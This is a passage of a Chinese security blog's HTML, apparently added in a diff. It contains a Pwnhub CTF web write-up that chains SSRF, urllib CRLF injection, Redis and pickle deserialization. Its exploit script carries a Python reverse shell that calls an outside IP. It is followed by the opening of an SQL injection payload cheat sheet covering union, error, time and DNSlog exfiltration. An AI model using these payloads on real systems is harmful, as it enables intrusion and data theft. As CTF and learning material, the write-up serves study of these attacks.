+<li><a target="_blank" rel="noopener" href="https://redn3ck.github.io/2018/04/25/Oracle%E6%B3%A8%E5%85%A5-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-Shell%E5%8F%8D%E5%BC%B9/">Oracle注入 - 命令执行&amp;Shell反弹</a></li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/06/02/pwnhub-web-writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="欣海余诚's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/06/02/pwnhub-web-writeup/" itemprop="url">Pwnhub公开赛之WEB题WriteUp</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-06-02T11:25:35+08:00">
+                2020-06-02
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
+                  </a>
+                </span>
+
+                
+                
+                  , 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/WEB%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
+                    <span itemprop="name">WEB安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>前段时间刚好看了p师傅的《Python安全 - 从SSRF到命令执行惨案》，没想到这次pwnhub公开赛就碰到了，思路几乎一模一样，都是通过ssrf结合python urllib的http头注入漏洞，对redis进行利用。</p>
+<p>本人总结的<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/getshell-via-ssrf-and-redis.html">原文</a>思路如下图：</p>
+<p><img src="1.png" alt="image"></p>
+<h2 id="0x01-SSRF"><a href="#0x01-SSRF" class="headerlink" title="0x01 SSRF"></a>0x01 SSRF</h2><p>随意注册账号后进入系统，检查了一遍只有一个 flag-spider功能，让输入url。猜测是考ssrf。</p>
+<p><img src="2.png" alt="image"></p>
+<p>测试了几个地址，发现</p>
+<ol>
+<li><p>可以连接到远程vps。</p>
+<p> <img src="3.png" alt="image"></p>
+</li>
+<li><p>可以使用file:///协议读取本地文件，尝试读取常见flag路径，不出意外是失败的，应该是改名了。</p>
+<p> <img src="4.png" alt="image"></p>
+</li>
+<li><p>6379端口开放redis服务</p>
+<p> <img src="5.png" alt="image"></p>
+</li>
+</ol>
+<h2 id="0x02-代码审计"><a href="#0x02-代码审计" class="headerlink" title="0x02 代码审计"></a>0x02 代码审计</h2><p>使用file协议<code>file:///proc/self/cmdline</code>读取运行命令，发现是用<code>gunicorn</code>服务器启动了<code>run.py</code>文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gunicorn --config=config.py run:app</span><br></pre></td></tr></table></figure>
+
+<p>读取<code>run.py</code> ：</p>
+<p><img src="6.png" alt="image"></p>
+<p>根据源码中<code>import</code>的模块，将<code>user.py</code>、<code>sipder.py</code>都读取下来，本地搭个环境进行测试。</p>
+<p>首先看flag-spider功能的逻辑，定位到run.py中spider函数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">@ app.route(&#x27;/spider/&#x27;, methods = 「&#x27;GET&#x27;, &#x27;POST&#x27;1)</span><br><span class="line">def spider():</span><br><span class="line">    cookie = request.cookies.get( &#x27;Cookie&#x27;)</span><br><span class="line">    try:</span><br><span class="line">        if Cookie.verify(cookie) and redis.exists(cookie):</span><br><span class="line">		    user = redis.get(cookie)</span><br><span class="line">		    user = pickle. loads(user)</span><br><span class="line">    except:</span><br><span class="line">        return abort(500)</span><br><span class="line">        result = &#x27;&#x27;</span><br><span class="line">    if request.method == &quot;GET&quot;:</span><br><span class="line">        result = &#x27;&#x27;</span><br><span class="line">    elif request.method != “GET&quot; and request.form.get(&#x27;url&#x27;) != None:</span><br><span class="line">        try:</span><br><span class="line">            target_url = request.form.get(&#x27;url&#x27;)</span><br><span class="line">            new spider = Spider(target url)</span><br><span class="line">            result = new spider.spiderFlag()</span><br><span class="line">        except Excetion as e:</span><br><span class="line">            result e</span><br><span class="line">    return render template(&quot;spider.html&quot;, result = str(result), user = user)</span><br></pre></td></tr></table></figure>
+<p>分析spider函数可知：</p>
+<ol>
+<li>获取cookie，如果cookie验证通过且redis存在，则获取redis中cookie对应的值进行反序列化</li>
+<li>如果method不为get且传入url参数，则调用Spider类对url进行爬取。</li>
+</ol>
+<p>再看Spider类:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import urllib </span><br><span class="line">import urllib.request </span><br><span class="line">from bs4 import BeautifulSoup </span><br><span class="line">class Spider: </span><br><span class="line">    def __init__(self, url): </span><br><span class="line">        self.target_url = url </span><br><span class="line">    def __getResponse(self): </span><br><span class="line">        try: </span><br><span class="line">            info = urllib.request.urlopen(self.target_url).read().decode(&quot;utf-8&quot;) </span><br><span class="line">            return (info, True) </span><br><span class="line">        except Exception as err: </span><br><span class="line">            return (err, False) </span><br><span class="line">    def spiderFlag(self): </span><br><span class="line">        infos = self.__getResponse() </span><br><span class="line">        if infos[1]: </span><br><span class="line">            soup = BeautifulSoup(infos[0]) </span><br><span class="line">            flag = soup.find(id==&#x27;flag&#x27;) </span><br><span class="line">            return infos[0] </span><br><span class="line">            return flag.text </span><br><span class="line">        return infos[0]</span><br></pre></td></tr></table></figure>
+<p>可以看出Spider类使用了urllib库对目标url发起请求，而这个库恰好也是p师傅文章中利用的一个点。</p>
+<p>注册逻辑：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">@ app.route(&#x27;/register/&#x27;, methods = [&#x27;GET&#x27;, &#x27;POST&#x27;]) </span><br><span class="line">def register(): </span><br><span class="line">	if request.method != &#x27;GET&#x27;: </span><br><span class="line">		email = request.form.get(&#x27;email&#x27;) </span><br><span class="line">		username = request.form.get(&#x27;username&#x27;) </span><br><span class="line">		password = request.form.get(&#x27;password&#x27;) </span><br><span class="line">		user = User(email, username, password) </span><br><span class="line">		cookie = Cookie() </span><br><span class="line">		cookie.create = username </span><br><span class="line">		cookie = cookie.create</span><br><span class="line">		try: </span><br><span class="line">			if not redis.exists(cookie): </span><br><span class="line">				redis.set(cookie, pickle.dumps(user)) </span><br><span class="line">				resp = make_response(redirect(url_for(&#x27;home&#x27;))) </span><br><span class="line">				resp.set_cookie(&quot;Cookie&quot;, cookie) </span><br><span class="line">				return resp </span><br><span class="line">			except: abort(500) </span><br><span class="line"></span><br><span class="line">	return render_template(&quot;register.html&quot;)</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>访问页面时先根据cookie在redis中查找key，若有则进行反序列化。</li>
+<li>用户注册时，根据user生成一个hash值，再拼接user作为cookie</li>
+<li>User对象反序列化存储到redis中，对应的key就是cookie</li>
+</ol>
+<p>本地测试注册后redis中的数据：</p>
+<p><img src="7.png" alt="image"></p>
+<p>猜测肯定就是要利用反序列化漏洞了。思路就是将redis中用户对应的的key设置为序列化后的payload，然后重新访问页面触发。</p>
+<p>接下来需要解决如何设置redis中的任意key，也就是找到urllib漏洞。</p>
+<h2 id="0x03-Python-urllib3-5-CRLF注入"><a href="#0x03-Python-urllib3-5-CRLF注入" class="headerlink" title="0x03 Python urllib3.5 CRLF注入"></a>0x03 Python urllib3.5 CRLF注入</h2><p>通过发送http请求对redis进行利用方式是，在请求包协议行后（也就是第二行）插入redis命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">config set dir /tmp</span><br><span class="line">Host: xx.xx.xx.xx:6379</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">GET /? HTTP/1.1</span><br><span class="line">config set dbfilename test</span><br><span class="line">Host: xx.xx.xx.xx:6379</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">GET /? HTTP/1.1</span><br><span class="line">save</span><br><span class="line">Host: xx.xx.xx.xx:6379</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+<p>那么如果控制了http请求头，就可以在redis中执行set命令，将key设置为paylaod。</p>
+<p>从服务器发送到vps的请求头看，目标服务器用的是urllib3.5版本。</p>
+<p>在本地下载python3.5.0，测试如下：</p>
+<ul>
+<li>CVE-2016-5699(失败): <code>http://[vps-ip]%0d%0aX-injected:%20header:8888</code></li>
+<li>CVE-2019-9740(失败): <code>http://[vps-ip]%0d%0a%0d%0aheaders:8888</code></li>
+<li>CVE-2019-9947(失败): <code>http://[vps-ip]:8888?%0d%0apayload%0d%0apadding</code></li>
+<li>CVE-2019-9740(成功): <code>http://[vps-ip]:8888?%20HTTP/1.1%0d%0aCONFIG SET dir /tmp%0d%0aTEST: 123:8080/test/?test=a</code></li>
+</ul>
+<p><img src="8.png" alt="image"></p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:6378?%20HTTP/1.1%0d%0aCONFIG SET dir /tmp%0d%0aTEST: 123:8080/test/?test=a</span><br><span class="line">http://127.0.0.1:6378?%20HTTP/1.1%0d%0aCONFIG SET dbfilename test12345%0d%0aTEST: 123:8080/test/?test=a</span><br><span class="line">http://127.0.0.1:6378?%20HTTP/1.1%0d%0aSAVE%0d%0aTEST: 123:8080/test/?test=a</span><br></pre></td></tr></table></figure>
+<p>本地在burp中测试了多次（<code>\r\n</code>要url编码），返回报错：</p>
+<p><img src="9.png" alt="image"></p>
+<p>但是服务器上成功创建了文件：</p>
+<p><img src="10.png" alt="image"></p>
+<p>对比赛服务器进行测试，写入到<code>/tmp/qweqwe</code>文件，再用<code>file:///tmp/qweqwe</code>读取。</p>
+<p><img src="11.png" alt="image"></p>
+<p>报<code>utf-8 code can&#39;t decode byte xxx</code>，说明文件写成功。</p>
+<h2 id="0x04-Redis利用"><a href="#0x04-Redis利用" class="headerlink" title="0x04 Redis利用"></a>0x04 Redis利用</h2><p>接下来尝试修改redis中的key。</p>
+<p>本地测试payload: </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">import pickle</span><br><span class="line">from flask import Flask, session</span><br><span class="line">from redis import StrictRedis</span><br><span class="line">from user import *</span><br><span class="line">import os</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">redis = StrictRedis(host = &#x27;127.0.0.1&#x27;, port = 6378, db = 0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class exp(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        s = &quot;&quot;&quot;/usr/local/python3/bin/python3.5 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;134.175.2.34&quot;,8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;&quot;&quot;&quot;</span><br><span class="line">        return (os.system, (s,))</span><br><span class="line"></span><br><span class="line">def localtest():</span><br><span class="line">    key = &#x27;admin1ac8dc1444250362004b743fa951951b&#x27;</span><br><span class="line">    e = pickle.dumps(exp()).replace(&quot;\n&quot;,&#x27;\\n&#x27;).replace(&quot;\&quot;&quot;,&quot;\\\&quot;&quot;)</span><br><span class="line">    </span><br><span class="line">    payload = &quot;http://127.0.0.1:6378?%20HTTP/1.1\r\nset \&quot;admin1ac8dc1444250362004b743fa951951b\&quot; \&quot;&quot; + e + &quot;\&quot;\r\nTEST: 123:8080/test/?test=a&quot;</span><br><span class="line">    print payload</span><br><span class="line">    data = &#123;&#x27;url&#x27;: payload&#125;</span><br><span class="line">    headers = &#123;&#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded&#x27;&#125;</span><br><span class="line">    r = requests.post(&quot;http://134.175.2.34:5000/spider/&quot;, data=data, headers=headers)</span><br><span class="line">    print r.content</span><br><span class="line"></span><br><span class="line">localtest()</span><br></pre></td></tr></table></figure>
+<p><img src="12.png" alt="image"></p>
+<p>redis中反弹shell写入成功：</p>
+<p><img src="13.png" alt="image"></p>
+<p>触发反序列化</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST &#x27;http://127.0.0.1:5000/spider/&#x27;</span><br></pre></td></tr></table></figure>
+<p>成功反弹shell：</p>
+<p><img src="14.png" alt="image"></p>
+<p>远程测试发现建立了连接，但是并没有shell。尝试备用地址才反弹成功，不知道什么原因= =。</p>
+<p><img src="15.png" alt="image"></p>
+<p>最终在根目录下发现flag文件。</p>
+<h2 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/getshell-via-ssrf-and-redis.html">Python安全 - 从SSRF到命令执行惨案</a></li>
+<li><a target="_blank" rel="noopener" href="https://xuanxuanblingbling.github.io/ctf/web/2019/10/13/complex/">清华校赛THUCTF2019 之 ComplexWeb</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5123">CVE-2019-9740 Python urllib CRLF injection vulnerability 浅析</a> </li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2019/11/20/sql-injection/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="欣海余诚's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/11/20/sql-injection/" itemprop="url">SQL注入笔记</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-11-20T15:05:44+08:00">
+                2019-11-20
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/WEB%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
+                    <span itemprop="name">WEB安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="0x01-常见注入类型"><a href="#0x01-常见注入类型" class="headerlink" title="0x01 常见注入类型"></a>0x01 常见注入类型</h2><h3 id="一、带回显"><a href="#一、带回显" class="headerlink" title="一、带回显"></a>一、带回显</h3><h4 id="1-联合注入"><a href="#1-联合注入" class="headerlink" title="1. 联合注入"></a>1. 联合注入</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and 1=1--+   ==&gt;   id=1&#x27; and 1^0--+   ==&gt;  select !0</span><br><span class="line">id=1&#x27; and 1=2--+   ==&gt;   id=1&#x27; and 1^1--+   ==&gt;</span><br><span class="line">1&#x27; and &#x27;1&#x27;=&#x27;1</span><br><span class="line">1&#x27; --+</span><br><span class="line">1&#x27; order by 2 -- -</span><br><span class="line">1&#x27; union select 1,2-- -</span><br><span class="line">注表名</span><br><span class="line">1&#x27; union select database(), group_concat(table_name) from information_schema.tables where table_schema=database()-- -</span><br><span class="line">注列名：</span><br><span class="line">1&#x27; union select table_name, group_concat(column_name) from information_schema.columns where table_name=&#x27;xxx&#x27;-- -;</span><br><span class="line"> select !1</span><br><span class="line">//注flag：</span><br><span class="line">id=-1&#x27;%20union%20select%201,username,password%20from%20security.users--+</span><br></pre></td></tr></table></figure>
+<h4 id="2-报错注入"><a href="#2-报错注入" class="headerlink" title="2.报错注入"></a>2.报错注入</h4><ol>
+<li><p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/e097a1c0d9ef">双查询注入(Duplicate entry报错)</a></p>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; union select 1,count(*),concat_ws(&#x27;:&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),floor(rand()*2)) as a from information_schema.tables group by a --+</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>group by floor(random(0)*2)出错的原因是key是个随机数，检测临时表中key是否存在时计算了一下floor(random(0)*2)可能为0，如果此时临时表只有key为1的行不存在key为0的行，那么数据库要将该条记录插入临时表，由于是随机数，插时又要计算一下随机值，此时floor(random(0)*2)结果可能为1，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值。</p>
+</blockquote>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/158705.html">Xpath报错</a></p>
+<p> 条件：Mysql&gt;5.1.5</p>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//updatexml():对xml进行查询和修改</span><br><span class="line">id=1&#x27; and updatexml(1,concat(0x26,(version()),0x26),1)--+</span><br><span class="line">id=1&#x27; and updatexml(1,concat(0x3a,(select username from security.users limit 1)), 1)--+</span><br><span class="line">//extractvalue():对xml进行查询和修改</span><br><span class="line">id=1&#x27; and (extractvalue(1,concat(0x26,(version()),0x26)))--+</span><br><span class="line"></span><br><span class="line">1&#x27; and updatexml(0,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;dvwa&#x27;),0)-- -</span><br><span class="line">1&#x27; and updatexml(1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),1)-- -</span><br><span class="line">1&#x27; and extractvalue(0,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;dvwa&#x27;))-- -</span><br></pre></td></tr></table></figure>
+<p> 报错注入只能爆出32位，结合substring爆出64位flag</p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://www.lsablog.com/networksec/penetration/error-based-blind-sqli/">整数溢出报错</a></p>
+<p> exp(x):计算e的x次方，需要Mysql&gt;5.5.5</p>
+<p> 原理：Exp()超过710会产生溢出。</p>
+<p> Payload: </p>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and (EXP(~(select * from(select version())a)))--+ //未试验成功</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h4 id="二、无回显"><a href="#二、无回显" class="headerlink" title="二、无回显"></a>二、无回显</h4><h4 id="1-基于时间"><a href="#1-基于时间" class="headerlink" title="1. 基于时间"></a>1. 基于时间</h4><ul>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/cyjaysun/p/4463979.html">延迟函数</a></li>
+</ul>
+<ol>
+<li><p>Mssql：</p>
+<p> waitfor {DELAY ‘time’ | TIME ‘time’}, time格式为“时:分:秒”。（无sleep函数）</p>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; waitfor delay &#x27;0:0:5&#x27;;--+</span><br></pre></td></tr></table></figure></li>
+<li><p>Mysql：</p>
+<p> BENCHMARK将一个表达式执行许多次：</p>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and(SELECT BENCHMARK(10000000,ENCODE(&#x27;hello&#x27;,&#x27;mom&#x27;))) and 1=1--+ //BENCHMARK(count, express)</span><br></pre></td></tr></table></figure>
+<p> sleep()函数：</p>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and(select sleep(5)) and 1=1--+</span><br><span class="line">1&#x27; and if(LENGTH(DATABASE())=13,SLEEP(1),0);</span><br><span class="line">1&#x27; and if(ord(SUBSTRING(user(),1,1))=114,SLEEP(1),0);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Postgresql</p>
+<p> 最新版本的PostgreSQL数据库(8.2及以上版本)中，可以使用pg_sleep函数来引起延迟：<code>id=1&#39; and SELECT pg_sleep(10);--+</code></p>
+</li>
+<li><p>Oracle:</p>
+<p> DBMS_PIPE.RECEIVE_MESSAGE函数将为从RDS管道返回的数据等待10秒。默认情况下，允许以public权限执行该包。 </p>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; or 1=dbms_pipe.receive_message(&#x27;RDS&#x27;, 10)--+ //</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h4 id="2-基于bool"><a href="#2-基于bool" class="headerlink" title="2. 基于bool"></a>2. 基于bool</h4><h4 id="3-DNSLOG带外"><a href="#3-DNSLOG带外" class="headerlink" title="3. DNSLOG带外"></a>3. DNSLOG带外</h4><p>mysql的secure_file_priv为空的时候可以使用,版本基本在5.5.53之前。(经测试，5.5.2也不能成功带外)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&quot;////test.hcg10m.dnslog.cn//a.txt&quot;);</span><br><span class="line">select load_file(concat(&quot;////&quot;, version(), &quot;.8em7js.ceye.io//a.txt&quot;));</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x02-如何区分后端数据库"><a href="#0x02-如何区分后端数据库" class="headerlink" title="0x02 如何区分后端数据库"></a>0x02 <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_34275734/article/details/91816289">如何区分后端数据库</a></h2><h3 id="1-看报错"><a href="#1-看报错" class="headerlink" title="1. 看报错"></a>1. 看报错</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Oracle：</span><br><span class="line">ORA-00933: SQL command not properly ended</span><br><span class="line"></span><br><span class="line">MS SQL Server：</span><br><span class="line">Microsoft SQL Native Client error &#x27;80040e14&#x27;</span><br><span class="line">Unclosed quotation mark after the character string</span><br><span class="line"></span><br><span class="line">PostgreSQL：</span><br><span class="line">Query failed: ERROR: syntax error at or near &quot;&#x27;&quot; at character 56 in /www/site/test.php on line 121.</span><br></pre></td></tr></table></figure>
+<h3 id="2-通过各个数据库特有的数据表和环境变量来判断"><a href="#2-通过各个数据库特有的数据表和环境变量来判断" class="headerlink" title="2. 通过各个数据库特有的数据表和环境变量来判断"></a>2. 通过各个数据库特有的数据表和环境变量来判断</h3><ul>
+<li><p>Oracle:</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 and (select count(*) from sys.user_tables)&gt;0 and 1=1</span><br></pre></td></tr></table></figure></li>
+<li><p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1056134">Mssql </a></p>
+<ul>
+<li>特有的系统表</li>
+</ul>
